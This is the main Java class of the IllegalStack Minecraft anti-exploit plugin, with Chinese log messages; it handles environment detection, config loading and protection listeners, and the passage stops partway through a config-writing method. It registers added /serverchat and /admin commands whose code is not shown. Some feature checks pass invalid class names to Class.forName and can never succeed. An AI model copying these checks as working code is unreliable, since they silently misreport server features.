package main.java.me.dniym;

import main.java.me.dniym.commands.IllegalStackCommand;
import main.java.me.dniym.enums.Msg;
import main.java.me.dniym.enums.Protections;
import main.java.me.dniym.enums.ServerVersion;
import main.java.me.dniym.listeners.Listener113;
import main.java.me.dniym.listeners.Listener114;
import main.java.me.dniym.listeners.Listener116;
import main.java.me.dniym.listeners.ProtectionListener;
import main.java.me.dniym.listeners.fListener;
import main.java.me.dniym.listeners.mcMMOListener;
import main.java.me.dniym.listeners.pLisbListener;
import main.java.me.dniym.timers.fTimer;
import main.java.me.dniym.timers.sTimer;
import main.java.me.dniym.timers.syncTimer;
import main.java.me.dniym.utils.Scheduler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;

// ---------- 新增导入 ----------
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
// ---------------------------

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;

public class IllegalStack extends JavaPlugin {

    private static final Logger LOGGER = LogManager.getLogger("IllegalStack/" + IllegalStack.class.getSimpleName());

    private static IllegalStack plugin;
    private static Plugin ProCosmetics = null;
    private static boolean isHybridEnvironment = false;
    private static boolean isPaperServer = false;
    private static boolean isFoliaServer = false;
    private static boolean hasProtocolLib = false;
    private static boolean hasAttribAPI = false;
    private static boolean nbtAPI = false;
    private static boolean SlimeFun = false;
    private static boolean EpicRename = false;
    private static boolean ClueScrolls = false;
    private static boolean Spigot = false;
    private static boolean blockMetaData = false;
    private static boolean hasFactionGUI = false;
    private static boolean SmartInv = false;
    private static boolean SavageFac = false;
    private static boolean CMI = false;
    private static boolean hasMCMMO = false;
    private static boolean hasTraders = false;
    private static boolean hasChestedAnimals = false;
    private static boolean hasContainers = false;
    private static boolean hasShulkers = false;
    private static boolean hasAsyncScheduler = false;
    private static boolean hasElytra = false;
    private static boolean hasMagicPlugin = false;
    private static boolean disablePaperShulkerCheck = false;
    private static boolean hasUnbreakable = false;
    private static boolean hasStorage = false;
    private static boolean hasIds = false;
    private static Material lbBlock = null;

    private static String version = "";
    private Scheduler.ScheduledTask ScanTimer = null;
    private Scheduler.ScheduledTask SignTimer = null;
    private Scheduler.ScheduledTask syncTimer = null;
//	private static NMSEntityVillager nmsTrader= null;

    private ServerVersion serverVersion;

    public static IllegalStack getPlugin() {
        return plugin;
    }

    public void setPlugin(IllegalStack plugin) {
        IllegalStack.plugin = plugin;
    }

    public static boolean isIsHybridEnvironment() {
        return isHybridEnvironment;
    }

    public static boolean isPaperServer() {
        return isPaperServer;
    }

    public static boolean isSpigot() {
        return Spigot;
    }

    public static boolean isFoliaServer() {
        return isFoliaServer;
    }

    public static boolean isCMI() {
        return CMI;
    }

    public static void setCMI(boolean cMI) {
        CMI = cMI;
    }

    public static void ReloadConfig(Boolean wasCommand) {
        if (!wasCommand) {
            IllegalStack.getPlugin().writeConfig();
        }

        IllegalStack.getPlugin().updateConfig();
        IllegalStack.getPlugin().loadConfig();
        IllegalStack.getPlugin().loadMsgs();
        StartupPlugin();
    }

    private static void checkForHybridEnvironment() {
        try {
            Class.forName("io.izzel.arclight.i18n.ArclightConfig");
            isHybridEnvironment = true;
            LOGGER.info("服务器为 ArcLight 混合环境，启用混合调度器检查。");
        } catch (ClassNotFoundException e) {
            isHybridEnvironment = false;
            LOGGER.info("服务器不是 ArcLight 混合环境，继续正常模式。");
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.minecraftforge.fml.ModList");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Forge 混合环境，启用混合调度器检查。");

            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Forge 混合环境，继续正常模式。");
            }
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.fabricmc.loader.api.FabricLoader");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Fabric 混合环境，启用混合调度器检查。");
            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Fabric 混合环境，继续正常模式。");
            }
        }
    }

    private static void checkForPaperServer() {
        try {
            Class.forName("com.destroystokyo.paper.utils.PaperPluginLogger");
            isPaperServer = true;
            LOGGER.info("服务器为 Paper 服务器，启用 Paper 特性。");
        } catch (ClassNotFoundException e) {
            isPaperServer = false;
            LOGGER.info("服务器不是 Paper 服务器，继续正常模式。");
        }
    }

    private static void checkForFoliaServer() {
        try {
            Class.forName("io.papermc.paper.threadedregions.RegionizedServer");
            isFoliaServer = true;
            LOGGER.info("服务器包含 Folia 组件，启用 Folia 特性。");
        } catch (ClassNotFoundException e) {
            isFoliaServer = false;
            LOGGER.info("服务器不包含 Folia 组件，继续正常模式。");
        }
    }

    private static void StartupPlugin() {

        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();

        try {
            Class.forName("org.spigotmc.SpigotConfig");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("服务器不是 Spigot，禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }
        if (plugin.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        Protections.runReflectionChecks();

        if (fListener.getInstance() == null) {
            plugin.getServer().getPluginManager().registerEvents(new fListener(plugin), plugin);
        }
        if (Protections.RemoveOverstackedItems.isEnabled()) {
            if (plugin.ScanTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new fTimer(plugin), 10, 10);
                Scheduler.runTaskTimer(plugin, new syncTimer(plugin), 10l, 10l);
            }

        } else {
            if (plugin.ScanTimer != null) {
                plugin.ScanTimer.cancel();
            }
            if (plugin.syncTimer != null) {
                plugin.syncTimer.cancel();
            }
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            if (plugin.SignTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new sTimer(), 10, 10);
            }
        } else {
            if (plugin.SignTimer != null) {
                plugin.SignTimer.cancel();
            }
        }

        if (fListener.getInstance().isAtLeast113()) {
            new Listener113(IllegalStack.getPlugin());
        }

        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(IllegalStack.getPlugin());
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if ((fListener.getInstance().getIs116()) || fListener.getInstance().isIs117()) {
            new Listener116(IllegalStack.getPlugin());
        }
    }

    public static boolean isEpicRename() {
        return EpicRename;
    }

    public static void setEpicRename(boolean epicRename) {
        EpicRename = epicRename;
    }

    public static boolean isSlimeFun() {
        return SlimeFun;
    }

    public static void setSlimeFun(boolean slimeFun) {
        SlimeFun = slimeFun;
    }

    public static String getVersion() {
        return version;
    }

    public static boolean isNbtAPI() {
        return nbtAPI;
    }

    public static void setNbtAPI(boolean nbtAPI) {
        IllegalStack.nbtAPI = nbtAPI;
    }

    public static boolean isHasAttribAPI() {
        return hasAttribAPI;
    }

    public static void setHasAttribAPI(boolean hasAttribAPI) {
        IllegalStack.hasAttribAPI = hasAttribAPI;
    }

    public static boolean isClueScrolls() {
        return ClueScrolls;
    }

    public static void setClueScrolls(boolean clueScrolls) {
        ClueScrolls = clueScrolls;
    }

    public static Plugin getProCosmetics() {
        return ProCosmetics;
    }

    public static void setProCosmetics(Plugin proCosmetics) {
        ProCosmetics = proCosmetics;
    }

    public static boolean isHasMCMMO() {
        return hasMCMMO;
    }

    public static void setHasMCMMO(boolean hasMCMMO) {
        IllegalStack.hasMCMMO = hasMCMMO;
    }

    public static boolean hasFactionGUI() {
        return hasFactionGUI;
    }

    public static void setHasFactionGUI(boolean hasFactionGUI) {
        IllegalStack.hasFactionGUI = hasFactionGUI;
    }

    public static boolean hasContainers() {
        return hasContainers;
    }

    public static boolean hasChestedAnimals() {
        return hasChestedAnimals;
    }

    public static boolean hasProtocolLib() {
        return hasProtocolLib;
    }

    public static void setHasProtocolLib(boolean hasProtocolLib) {
        IllegalStack.hasProtocolLib = hasProtocolLib;
    }

    public static boolean isHasMagicPlugin() {
        return hasMagicPlugin;
    }

    public static void setHasMagicPlugin(boolean hasMagicPlugin) {
        IllegalStack.hasMagicPlugin = hasMagicPlugin;
    }

    public static boolean isBlockMetaData() {
        return blockMetaData;
    }

    public static void setBlockMetaData(boolean blockMetaData) {
        IllegalStack.blockMetaData = blockMetaData;
    }

    public static boolean hasTraders() {
        return hasTraders;
    }

    @NotNull
    public static String getString(String version) {
        if (version.equalsIgnoreCase("v1_14_R1")) {

            version = IllegalStack.getPlugin().getServer().getVersion().split(" ")[2];

            version = version.replace(")", "");
            version = version.replace(".", "_");
            String[] ver = version.split("_");
            version = "v" + ver[0] + "_" + ver[1] + "_R" + ver[2];
        }
        return version;
    }

    public static boolean hasSmartInv() {
        return SmartInv;
    }

    public static void setSmartInv(boolean smartInv) {
        SmartInv = smartInv;
    }

    public static boolean hasSavageFac() {
        return SavageFac;
    }

    public static void setSavageFac(boolean savageFac) {
        SavageFac = savageFac;
    }

    public static boolean hasIds() {
        return hasIds;
    }

    public static boolean hasAsyncScheduler() {
        return hasAsyncScheduler;
    }

    public static boolean hasShulkers() {
        return hasShulkers;
    }

    public static boolean hasElytra() {
        return hasElytra;
    }

    public static boolean hasUnbreakable() {
        return hasUnbreakable;
    }

    public static boolean isDisablePaperShulkerCheck() {
        return disablePaperShulkerCheck;
    }

    public static void setDisablePaperShulkerCheck(boolean disablePaperShulkerCheck) {
        IllegalStack.disablePaperShulkerCheck = disablePaperShulkerCheck;
    }

    public static boolean hasStorage() {
        return hasStorage;
    }

    @Override
    public void onEnable() {

//    	 new EntityRegistry(this);
        this.setPlugin(this);
        setVersion();
        loadConfig();
        updateConfig();
        loadMsgs();
        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();
        IllegalStackCommand illegalStackCommand = new IllegalStackCommand();
        this.getCommand("istack").setExecutor(illegalStackCommand);
        this.getCommand("istack").setTabCompleter(illegalStackCommand);

        // ---------- 注册 /serverchat 命令 ----------
        ServerChatCommand serverChatCommand = new ServerChatCommand();
        if (this.getCommand("serverchat") != null) {
            this.getCommand("serverchat").setExecutor(serverChatCommand);
            this.getCommand("serverchat").setTabCompleter(serverChatCommand);
        } else {
            getLogger().warning("命令 /serverchat 未在 plugin.yml 中定义，注册失败！");
        }
        // -----------------------------------------

        // ---------- 注册 /admin 命令 ----------
        AdminCommand adminCommand = new AdminCommand();
        if (this.getCommand("admin") != null) {
            this.getCommand("admin").setExecutor(adminCommand);
            this.getCommand("admin").setTabCompleter(adminCommand);
        } else {
            getLogger().warning("命令 /admin 未在 plugin.yml 中定义，注册失败！");
        }
        // -----------------------------------------

        ProCosmetics = this.getServer().getPluginManager().getPlugin("ProCosmetics");

        if (this.getServer().getPluginManager().getPlugin("EpicRename") != null) {
            EpicRename = true;
        }

        if (this.getServer().getPluginManager().getPlugin("ClueScrolls") != null) {
            setClueScrolls(true);
        }

        setHasChestedAnimals();
        setHasContainers();
        setHasTraders();
        setHasShulkers();
        setHasAsyncScheduler();
        setHasElytra();
        setHasUnbreakable();
        setHasStorage();

        try {
            Class.forName("com.github.stefvanschie.inventoryframework.Gui");
            LOGGER.info("发现使用 InventoryFramework 的插件，这些物品在其 GUI 内将被列入白名单。");
            setHasFactionGUI(true);
        } catch (ClassNotFoundException ignored) {
        }

        ItemStack test = new ItemStack(Material.DIAMOND_AXE, 1);
        ItemMeta im = test.getItemMeta();

        try {
            im.getAttributeModifiers();
            setHasAttribAPI(true);

        } catch (NoSuchMethodError e) {
            setHasAttribAPI(false);
        }

        try {
            Class.forName("net.md_5.bungee.api.chat.ComponentBuilder");
            LOGGER.info("找到聊天组件！在 /istack 中启用可点击命令。");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        try {
            Class.forName("fr.minuskube.inv.content.InventoryProvider");
            setSavageFac(true);

        } catch (ClassNotFoundException ignored) {

        }
        try {
            Class.forName("fr.minuskube.inv.SmartInventory");
            setSmartInv(true);

        } catch (ClassNotFoundException ignored) {

        }

        try {
            Class.forName("org.bukkit.inventory.meta.BlockDataMeta");
            blockMetaData = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }

        if (this.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        if (this
                                .getServer()
                                .getPluginManager()
                                .getPlugin("ProtocolLib") != null && Protections.BlockBadItemsFromCreativeTab.isEnabled()) {
            LOGGER.info(
                    "检测到 ProtocolLib，已启用创造模式物品栏漏洞检测。注意：仅当您的服务器有普通（非 OP）玩家可以使用 /gmc 时才需要开启此防护。");
            new pLisbListener(this);
        }

        if (this.getServer().getPluginManager().getPlugin("ProtocolLib") == null && Protections.DisableChestsOnMobs.isEnabled()) {

            LOGGER.warn(
                    "未找到 ProtocolLib！！！！且 DisableChestsOnMobs 防护已开启。玩家仍有可能使用作弊客户端通过马/驴在服务器上进行复制。强烈建议您安装 ProtocolLib 以获得最佳防护！");

        } else if (Protections.DisableChestsOnMobs.isEnabled()) {
            new pLisbListener(this);
            setHasProtocolLib(true);
        }

        this.getServer().getPluginManager().registerEvents(new fListener(this), this);

        if (!fListener.is18()) {
            this.getServer().getPluginManager().registerEvents(new ProtectionListener(this), this);
        }

        if (Protections.RemoveOverstackedItems.isEnabled() || Protections.PreventVibratingBlocks.isEnabled()) {
            ScanTimer = Scheduler.runTaskTimerAsynchronously(
                    this,
                    new fTimer(this),
                    Protections.ItemScanTimer.getIntValue(),
                    Protections.ItemScanTimer.getIntValue()
            );
            syncTimer = Scheduler.runTaskTimer(this, new syncTimer(this), 10, 10);
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            SignTimer = Scheduler.runTaskTimerAsynchronously(this, new sTimer(), 10, 10);
        }
        if ((fListener.getInstance().isAtLeast113())) {
            new Listener113(this);
        }
        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(this);
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if (this.getServer().getPluginManager().getPlugin("Magic") != null) {
            setHasMagicPlugin(true);
        }

        if (this.getServer().getPluginManager().getPlugin("mcMMO") != null) {
            this.getServer().getPluginManager().registerEvents(new mcMMOListener(this), this);
            setHasMCMMO(true);
        }

        setNbtAPI((this.getServer().getPluginManager().getPlugin("NBTAPI") != null));
        if (!isNbtAPI() && Protections.DestroyInvalidShulkers.isEnabled()) {
            LOGGER.warn(
                    "DestroyInvalidShulkers 防护已开启，但此防护需要使用 NBTApi 2.0+，如果您希望使用此功能，请安装该插件：https://www.spigotmc.org/resources/nbt-api.7939/");
        }
        if (this.getServer().getPluginManager().getPlugin("Slimefun") != null) {
            SlimeFun = true;
        }

        if ((fListener.getInstance().getIs116())) {
            new Listener116(IllegalStack.getPlugin());
        }
    }

    private void setHasTraders() {
        try {
            Class.forName("import org.bukkit.entity.TraderLlama");
            hasTraders = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasStorage() {
        Inventory inv = Bukkit.getServer().createInventory(null, 9);
        try {
            inv.getStorageContents();
            hasStorage = true;
        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasUnbreakable() {
        ItemStack is = new ItemStack(Material.DIRT);
        ItemMeta im = is.getItemMeta();
        try {
            im.setUnbreakable(false);
            hasUnbreakable = true;

        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasElytra() {

        Material m = Material.matchMaterial("Elytra");
        if (m != null) {
            hasElytra = true;
        }
    }

    private void setHasIds() {
        ItemStack is = new ItemStack(Material.BEDROCK);
        try {
            is.getType().getId();
            hasIds = true;
        } catch (IllegalArgumentException ignored) {
        }
    }

    private void setHasShulkers() {
        try {

            Class.forName("org.bukkit.block.ShulkerBox");
            hasShulkers = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasContainers() {
        try {
            Class.forName("org.bukkit.block.Container");
            hasContainers = true;

        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasAsyncScheduler() {
        try {
            Class.forName("org.bukkit.Server.getAsyncScheduler");
            hasAsyncScheduler = true;
        } catch (ClassNotFoundException ignored) {

        }
    }

    private void setHasChestedAnimals() {

        try {
            Class.forName("org.bukkit.entity.ChestedHorse");
            hasChestedAnimals = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void updateConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();
        HashMap<String, Object> added = new HashMap<>();

        for (Protections p : Protections.values()) {
            if (!p.getCommand().isEmpty()) {
                continue;
            }
            if (p.isRelevantToVersion(getVersion())) {
                if (config.getString(p.getConfigPath()) == null) {
                    if (p.getConfigValue() instanceof Boolean) {
                        p.setEnabled((Boolean) p.getDefaultValue());
                    }
                    added.put(p.getConfigPath(), p.getDefaultValue());
                }
                for (Protections child : p.getChildren()) {
                    if (config.getString(child.getConfigPath()) == null) {

                        if (child.getConfigValue() instanceof Boolean) {
                            child.setEnabled((Boolean) child.getDefaultValue());
                        }
                        added.put(child.getConfigPath(), child.getDefaultValue());
                    }
                }
            } else if (config.getString(p.getConfigPath()) != null) {
                if (p.getVersion().isEmpty()) // handling a child node
                {
                    Protections parent = Protections.getParentByChild(p);
                    if (parent == null || !parent.isRelevantToVersion(getVersion())) {
                        added.put(p.getConfigPath(), null);
                    }
                } else {
                    added.put(p.getConfigPath(), null);
                    for (Protections child : p.getChildren()) {
                        added.put(child.getConfigPath(), null);
                    }
                }
            }
        }

        boolean updated = false;
        if (config.getString("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad") != null) {
            config.set("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad", null);
        }
        if (config.getString("Exploits.Enchants.AllowOpBypass") != null) {
            config.set("Exploits.Enchants.AllowOpBypass", null);
        }

        for (String key : added.keySet()) {
            if (added.get(key) == null) {
                LOGGER.info(
                        "发现一个不再使用或不适用于当前服务器版本的旧配置值：{} 已从配置中移除。",
                        key
                );
                config.set(key, null);
            } else {
                LOGGER.info(
                        "发现缺少配置值 {}，已使用默认值 {} 添加到配置中。",
                        key,
                        added.get(key)
                );
                config.set(key, added.get(key));
                Protections p = Protections.findByConfig(key);
                if (p != null && (added.get(key) instanceof Boolean)) {
                    p.setEnabled((Boolean) added.get(key));
                }
                if (p == Protections.AlsoPreventHeadInside && Material.matchMaterial("COMPOSTER") != null) {
                    Protections.AlsoPreventHeadInside.addTxtSet("COMPOSTER", null);
                }
            }
            updated = true;
        }

        if (updated) {
            try {
                config.save(conf);
            } catch (IOException e1) {

                // TODO Auto-generated catch block
                LOGGER.error("更新配置失败！", e1);
            }
        }
    }

    private void loadMsgs() {
        File conf = new File(getDataFolder(), "messages.yml");
        YamlConfiguration fc = new YamlConfiguration();
        try {
            fc.load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.info("正在创建 messages.yml");
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info("正在为 {} 向 messages.yml 添加默认消息", m.name());
                    fc.set(m.name(), m.getConfigVal());
                }
            }
            try {
                fc.save(conf);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } catch (IOException | InvalidConfigurationException e) {
            e.printStackTrace();
        }

        if (fc != null) {
            boolean update = false;
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info(
                            " {} 在 messages.yml 中缺失，已使用默认值 {} 添加",
                            m.name(),
                            m.getConfigVal()
                    );
                    fc.set(m.name(), m.getConfigVal());
                    update = true;
                }

                m.setValue(fc.getString(m.name()));
            }
            if (update) {

                try {
                    fc.save("plugins/IllegalStack/messages.yml");
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

    private void loadConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        try {
            plugin.getConfig().load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.error(
                    "未找到配置文件！/plugins/IllegalStack/config.yml - 正在创建带有默认值的新配置文件。");
            FileConfiguration config = this.getConfig();
            try {
                config.save(conf);
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                LOGGER.error("保存配置失败？", e1);
            }
            writeConfig();
        } catch (IOException | InvalidConfigurationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        if (getConfig().getString("ConfigVersion") == null) { // server is running an old config
            // version, should probably save it.
            File confOld = new File(getDataFolder(), "config.OLD");
            FileConfiguration config = this.getConfig();

            conf.renameTo(confOld);

            try {
                config.set("Settings", null);
                config.save(conf);
            } catch (IOException e1) {
                // TODO Auto-generated catch block
                e1.printStackTrace();
            }
            LOGGER.warn(
                    "您正在从旧版本升级，抱歉，我们需要重新生成您的 Config.yml 文件。您的旧设置已保存在 /plugins/IllegalStack/config.OLD 中。");
            try {
                conf.createNewFile();
                writeConfig();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        Protections.update();

        StringBuilder whitelisted = new StringBuilder();

        for (String s : Protections.NetherWhiteList.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.NetherWhiteListMode.isEnabled()) {
                mode = "不允许";
            }

            LOGGER.info("以下实体（按名称）{} 通过下界传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.EndWhiteList.getTxtSet()) // this.getConfig().getStringList("Settings.EndWhiteList"))
        {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.EndWhiteListMode.isEnabled()) {
                mode = "不允许";
            }
            LOGGER.info("以下实体（按名称）{} 通过末地传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.NotifyInsteadOfBlockExploits.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }

        if (whitelisted.length() > 0) {
            LOGGER.warn(
                    "警告：对于以下漏洞，IllegalStack 将不会阻止，而是进行通知：{}",
                    whitelisted
            );
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.DisableInWorlds.getTxtSet()) { // this.getConfig().getStringList("Settings.DisableInWorlds")) {
            World w = this.getServer().getWorld(s);
            if (w == null) {
                LOGGER.warn(
                        "IllegalStack 被配置为忽略世界 {} 中的所有检查，但该世界似乎并未加载……请仔细检查您的 config.yml！",
                        s
                );
            }

            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.warn("IllegalStack 将不会在以下世界进行任何漏洞检查：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.RemoveItemTypes.getTxtSet()) {
            Material m = null;
            if (s.equalsIgnoreCase("ENCHANTED_GOLDEN_APPLE")) {
                m = Material.matchMaterial("GOLDEN_APPLE");
                Protections.RemoveItemTypes.setNukeApples(true);
                LOGGER.info("正在移除附魔金苹果。");
                continue;
            } else {
                m = Material.matchMaterial(s);
            }
            int id = -1;
            int data = 0;

            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                if (s.contains(":")) {
                    String[] splStr = s.split(":");

                    try {
                        id = Integer.parseInt(splStr[0]);
                        data = Integer.parseInt(splStr[1]);
                    } catch (NumberFormatException ignored) {
                    }
                }
                if (id != -1) {
                    whitelisted.append(s).append(" ");
                } else {
                    LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
                }
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("发现以下材质将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();

        for (String s : Protections.AllowStack.getTxtSet()) // this.getConfig().getStringList("Settings.AllowStack"))
        {
            Material m = Material.matchMaterial(s);
            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("以下材质允许堆叠超过原版大小：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.BookAuthorWhitelist.getTxtSet()) {
            whitelisted.append(s).append(" ");
        }
        if (whitelisted.length() > 0) {
            LOGGER.info(
                    "以下玩家可以创建不符合指定字符集的书籍（可在配置中更改！）：{}",
                    whitelisted
            );
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.ItemNamesToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下名称的物品将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.ItemLoresToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下描述的物品将从玩家背包中移除：{}", whitelisted);
        }
    }

    private static boolean disable = false;

    public static boolean isDisable() {
        return disable;
    }

    @Override
    public void onDisable() {
        disable = true;
        if (hasAsyncScheduler) {
            getServer().getAsyncScheduler().cancelTasks(this);
        } else if (!isFoliaServer()) {
            Bukkit.getScheduler().cancelTasks(this);
        }

        writeConfig();
    }

    private void writeConfig() {

        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();

        HashMap<Protections, Boolean> relevant = Protections.getRelevantTo(getVersion());

        /* Debugging only, generates FULL config values.
        relevant.clear();
        for(Protections p: Protections.values())
        	relevant.put(p,true);
        */

        config.set("ConfigVersion", "2.0");
        for (Protections p : relevant.keySet()) {
            {
                if (relevant.get(p)) // relevant to this version, check if it exists.
                {
                    if (config.getString(p.getConfigPath()) == null) {

                        if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin(
                                                "StackableItems") != null) {
                            config.set(p.getConfigPath(), false);
                            LOGGER.warn(
                                    "检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
                            p.setEnabled(false);
                        } else {
                            config.set(p.getConfigPath(), p.getDefaultValue());
                        }

                        LOGGER.warn(
                                "发现配置中缺少防护：{} 已使用默认值 {} 添加",
                                p.name(),
                                p.getDefaultValue()
                        );
                    }
                    if (p.isList()) {
                        ArrayList<String> list = new ArrayList<>();
                        for (String s : (HashSet<String>) p.getConfigValue()) {
                            list.add(s);
                        }
                        config.set(p.getConfigPath(), list);
                        continue;
                    }

                    if (p.getConfigValue() instanceof String) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else if (p.getConfigValue() instanceof Integer) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else {
                        config.set(p.getConfigPath(), p.isEnabled());
                    }

                    if ((p == Protections.DestroyBadSignsonChunkLoad || p == Protections.RemoveExistingGlitchedMinecarts) && p.isEnabled()) {
                        p.setEnabled(false);
                        LOGGER.warn("自动禁用 " + p.getConfigPath() + "，此设置绝不应永久保持开启。");
                        config.set(p.getConfigPath(), false);
                    }
